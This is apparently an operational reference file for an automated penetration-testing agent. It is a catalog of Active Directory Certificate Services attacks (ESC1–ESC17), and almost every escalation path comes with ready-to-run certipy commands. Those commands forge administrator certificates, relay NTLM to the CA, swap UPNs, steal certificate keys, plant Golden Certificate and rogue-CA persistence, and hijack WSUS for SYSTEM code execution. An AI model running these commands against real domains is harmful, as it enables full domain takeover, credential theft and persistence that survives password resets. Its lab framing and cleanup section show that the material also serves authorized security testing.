# Active Directory Certificate Services (AD CS)

A CA in the domain turns almost any write primitive or relay into domain
compromise, and the certificate keeps working across password resets. On a lab
box the tell is fast: `Certificate Service DCOM Access` in a `whoami /all`, an
`adcs` finding from `nxc`, or an enrollment web page on `/certsrv/`.

Everything below runs from the container with `certipy` (pure Python, fine on
arm64). Enumerate first, always:

```bash
pwnloop x "nxc ldap $T -d <domain> -u <u> -p <p> -M adcs"          # is there a CA?
pwnloop x "certipy find -u <u>@<domain> -p <p> -dc-ip $T -stdout -vulnerable"
pwnloop x "certipy find -u <u>@<domain> -p <p> -dc-ip $T -stdout"  # full, read it all
```

`certipy find` writes a JSON/BloodHound bundle too — grep it for `ESC` and for
template names. **Do not trust the `[!] ESCx` tag blindly**; confirm the
underlying settings (below) in the same output. A tag is a lead, the four
conditions are the plan.

`certipy auth` is **PKINIT — it is Kerberos — so clock skew kills it.**
`KRB_AP_ERR_SKEW` is not a broken exploit. The container can't step its own
clock; measure the offset and shim the one process (see `references/ad.md`
Kerberos section):

```bash
pwnloop x "ntpdate -q $T"
pwnloop x "faketime \"\$(date -u -d '+7 hours' '+%F %T')\" certipy auth -pfx admin.pfx -dc-ip $T"
```

## The escalation catalog (ESC1–ESC16)

### ESC1 — enrollee supplies subject
Template lets a low-priv group enrol, no manager approval, an auth EKU (Client
Auth / PKINIT / Smart-Card Logon / Any Purpose / no EKU), and
`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. You put the SAN → you become anyone.

```bash
pwnloop x "certipy req -u <u>@<dom> -p <p> -dc-ip $T -ca <CA> -template <T> \
   -upn administrator@<dom> -sid <admin-SID>"     # -sid satisfies post-2022 SID binding
pwnloop x "certipy auth -pfx administrator.pfx -dc-ip $T"     # → TGT + NT hash
```
Get the admin SID from `certipy find`, `nxc`, or an LDAP dump. Omitting it fails
on patched DCs (strong mapping).

### ESC2 — Any Purpose / no EKU
Same enrol conditions, but EKU is Any-Purpose (`2.5.29.37.0`) or empty. The cert
authenticates *and* can sign further certs (subordinate-CA-like). Abuse as ESC3.

### ESC3 — enrollment agent
Template has the Certificate Request Agent EKU (`1.3.6.1.4.1.311.20.2.1`). Enrol
for an agent cert, then request on-behalf-of any principal against a
domain-auth template.
```bash
pwnloop x "certipy req -u <u>@<dom> -p <p> -dc-ip $T -ca <CA> -template <AgentTpl>"
pwnloop x "certipy req -u <u>@<dom> -p <p> -dc-ip $T -ca <CA> -template User \
   -pfx <u>.pfx -on-behalf-of '<dom>\\administrator'"
```

### ESC4 — template DACL you can write
You hold `Owner/FullControl/WriteDacl/WriteOwner/WriteProperty` over a template.
Rewrite it into an ESC1, exploit, restore.
```bash
pwnloop x "certipy template -u <u>@<dom> -p <p> -template <T> -save-old"   # → makes it ESC1
pwnloop x "certipy req ... -template <T> -upn administrator@<dom>"
pwnloop x "certipy template -u <u>@<dom> -p <p> -template <T> -configuration <T>.json"  # restore
```

### ESC5 — DACL on a PKI object other than the template
Write over the CA computer object, the CA's RPC/DCOM object, or anything under
`CN=Public Key Services,…` (`NTAuthCertificates`, the CA container). Turns into
DPERSIST/ESC7-style control.

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA
CA-wide flag: requester-supplied SAN accepted on *any* template. Request the
plain `User` template with a forged UPN. Post-May-2022 this only works if the DC
is also ESC10-weak (SAN preferred over the SID extension).
```bash
pwnloop x "certipy req -u <u>@<dom> -p <p> -ca <CA> -template User -upn administrator@<dom>"
```

### ESC7 — ManageCA / ManageCertificates on the CA
`ManageCA` can flip `EDITF_ATTRIBUTESUBJECTALTNAME2` (needs CertSvc restart).
More reliable: grant yourself `ManageCertificates` (add-officer), enable the
`SubCA` template, request it (denied → save key + request ID), then issue the
failed request and retrieve it.
```bash
pwnloop x "certipy ca -ca <CA> -add-officer <u> -u <u>@<dom> -p <p>"
pwnloop x "certipy ca -ca <CA> -enable-template SubCA -u <u>@<dom> -p <p>"
pwnloop x "certipy req -u <u>@<dom> -p <p> -ca <CA> -template SubCA -upn administrator@<dom>"  # note Request ID
pwnloop x "certipy ca -ca <CA> -issue-request <id> -u <u>@<dom> -p <p>"
pwnloop x "certipy req -u <u>@<dom> -p <p> -ca <CA> -retrieve <id>"
```

### ESC8 — NTLM relay to the web/CES enrollment endpoint
`/certsrv/` (HTTP) or CES/NDES accept relayed NTLM. Coerce a privileged account
(see `references/relay.md`), relay to the CA, get its cert. DC targets need
`-template DomainController`.
```bash
pwnloop x "certipy relay -ca ca.<dom> -template DomainController"   # listens :445
# then coerce the DC to authenticate to you — PetitPotam/PrinterBug, see relay.md
```

### ESC9 — no security extension
Template sets `CT_FLAG_NO_SECURITY_EXTENSION` (no SID in the cert). With
`GenericWrite` over a victim account you retarget its UPN to the admin, enrol,
revert. Needs weak mapping (`StrongCertificateBindingEnforcement != 2`).
```bash
pwnloop x "certipy shadow auto -u <u>@<dom> -p <p> -account <victim>"       # get victim hash
pwnloop x "certipy account update -u <u>@<dom> -p <p> -user <victim> -upn administrator"
pwnloop x "certipy req -u <victim>@<dom> -hashes <h> -ca <CA> -template <ESC9tpl>"
pwnloop x "certipy account update -u <u>@<dom> -p <p> -user <victim> -upn <victim>@<dom>"  # revert
pwnloop x "certipy auth -pfx administrator.pfx -domain <dom>"
```

### ESC10 — weak certificate mapping on the DC
Registry weakness, not a template. Case 1: `StrongCertificateBindingEnforcement=0`
→ any template works, same UPN-swap dance as ESC9. Case 2:
`CertificateMappingMethods` has the UPN bit (`0x4`) → target accounts *without*
a UPN (machine accounts, built-in `Administrator`) by setting the victim UPN to
e.g. `DC$@dom`, then `certipy auth … -ldap-shell` and `set_rbcd`.

### ESC11 — NTLM relay to the RPC (ICPR) endpoint
CA without `IF_ENFORCEENCRYPTICERTREQUEST` → relay over RPC, no signing.
```bash
pwnloop x "certipy relay -target 'rpc://ca.<dom>' -ca <CA> -dc-ip $T"
```

### ESC12 — shell on a CA with a YubiHSM
HSM auth key sits in cleartext at
`HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`. With a shell, import the CA
cert, repair-store against the HSM CSP, then `certutil -sign` arbitrary certs.

### ESC13 — issuance policy linked to a group (OIDToGroupLink)
A template's issuance-policy OID has `msDS-OIDToGroupLink` to a privileged
group. Enrol → the cert grants that group's rights. Just request the template.
```bash
pwnloop x "certipy req -u <u>@<dom> -p <p> -dc-ip $T -target dc.<dom> -ca <CA> -template <T>"
```

### ESC14 — weak explicit mapping (altSecurityIdentities)
An account's `altSecurityIdentities` maps by something guessable/settable (CN,
email, DNS). If you can write it, or set the matching attribute on a victim you
control, you enrol as the victim and authenticate as the target. Strong-mapping
enforcement on the DC does not save a weak *explicit* mapping.

### ESC15 — EKUwu / arbitrary application policy (CVE-2024-49019)
V1 templates with enrollee-supplied subject (e.g. `WebServer`): inject an
application policy the template never intended.
```bash
# Direct: inject Client Auth + forged UPN, auth over Schannel
pwnloop x "certipy req -u <u>@<dom> -p <p> -dc-ip $T -target ca.<dom> -ca <CA> \
   -template WebServer -upn administrator@<dom> -sid <SID> -application-policies 'Client Authentication'"
pwnloop x "certipy auth -pfx administrator.pfx -dc-ip $T -ldap-shell"
# Or inject 'Certificate Request Agent' and chain ESC3-style on-behalf-of.
```

### ESC16 — security extension disabled CA-wide
CA omits the SID extension on every cert. Same UPN-swap as ESC9/10 but works
against any client-auth template because no cert ever carries a SID.

## Certificate theft (already-issued certs on a compromised host)

- **THEFT1** — exportable key in an interactive session: `certmgr.msc → export`,
  or `SharpDPAPI`/CertStealer. Non-exportable → Mimikatz `crypto::capi` /
  `crypto::cng` patches the API.
- **THEFT2/3** — keys are DPAPI-protected. User keys under
  `%APPDATA%\Microsoft\Crypto\{RSA,Keys}`; machine keys need the `DPAPI_SYSTEM`
  LSA secret. `SharpDPAPI certificates [/machine]` automates it.
- **THEFT4** — hunt files: `.pfx .p12 .pkcs12 .pem .key .crt .cer .jks
  .keystore`. Password-protected pfx → `pfx2john` then crack.
- **THEFT5 (UnPAC-the-hash)** — a PKINIT TGT carries the account's NTLM in the
  PAC. `certipy auth -pfx x.pfx` returns the NT hash directly; Rubeus
  `asktgt … /getcredentials` does the same on Windows.

## Persistence (after you own the CA/domain)

- **Golden Certificate (DPERSIST1)** — steal the CA cert+key and forge auth
  certs for anyone. Unrevokable (the CA never saw them), valid for the CA's
  lifetime.
  ```bash
  pwnloop x "certipy ca '<dom>/administrator@ca.<dom>' -hashes :<nt> -backup"   # pull CA key
  pwnloop x "certipy forge -ca-pfx CA.pfx -upn administrator@<dom> -sid <SID> -out admin.pfx"
  ```
  Under 2025 Full-Enforcement embed `-sid`, or add a strong explicit mapping.
- **DPERSIST2** — publish a rogue CA into `NTAuthCertificates`
  (`certutil -enterprise -AddStore NTAuth rogue.crt`). Any cert you sign now
  authenticates.
- **DPERSIST3** — plant control ACEs (`WriteOwner`/`WriteDacl`) on templates or
  PKI containers so the escalation re-arms itself after cleanup.

## Cleanup (mandatory — certs outlive password resets)

Revoke every cert you issued; `certutil -revoke` needs the serial, not the
request ID:
```powershell
certutil -view -restrict "RequestId=<id>" -out "SerialNumber"
certutil -revoke <serial> 4          # 4 = superseded
```
Delete any computer accounts, officer grants, template edits, and
`altSecurityIdentities`/`NTAuth` entries you added. Golden certs cannot be
revoked — note them in the ledger as un-removable and flag the CA-key rotation
the defender must perform.

## Enumerate AD CS *as each foothold principal* — enrollment is per-identity

`certipy find -vulnerable` reports only templates the **authenticating user can
enrol in**, because enrolment rights are an ACL on the template. A template that is
ESC-vulnerable *for a group you are not in* returns nothing — producing a false
"AD CS is a dead end". So the check is not "did AD CS look vulnerable once"; it is
**re-run `certipy find -vulnerable -k` as every user you pivot to**, especially
after landing in a new group. A low-priv user can legitimately see zero vulnerable
templates while the *next* user (in an IT/ops group) sees a critical one. When you
only have code-exec as the user (no password/hash), mint a usable TGT with Rubeus
`tgtdeleg /nowrap` → `ticketConverter` → ccache, and enumerate with that.

## ESC17 (Server-Auth + enrollee-supplies-subject) → impersonate a *service*, not a user

ESC1's cousin: the template lets the requester choose the subject **and** carries the
Server-Authentication EKU. That is not primarily a user-auth path — it is a licence to
**mint a TLS server certificate for any hostname**, trusted by anything that validates
against the domain CA. The escalation is then: find a service the DC (or another host)
consumes *by name over TLS without pinning*, get write on the AD-integrated DNS zone
(`CREATE_CHILD` is enough — check `bloodyAD get writable`), point that name at yourself,
present the ESC17 cert, and MITM the protocol.

The classic sink is **WSUS**: a Windows host configured with `WUServer=https://<name>:8531`
will install attacker-supplied "updates" as SYSTEM if it trusts your cert. If the WSUS
name is `NXDOMAIN`, you don't even fight an existing record — just create it. Reasoning
that transfers: **Server-Auth + name-choice + a DNS write + an unpinned by-name TLS
client = code execution as whatever consumes that service.** Tooling: `certipy req
-template <t> -dns <name>`, `bloodyAD add dnsRecord`, and `wsuks --serve-only` for the
WSUS case (force the client poll with `wuauclt /detectnow`). Do not assume a WSUS box is
the *server-side* deserialization CVE — a DC is often a WSUS *client*, which is this
MITM instead.
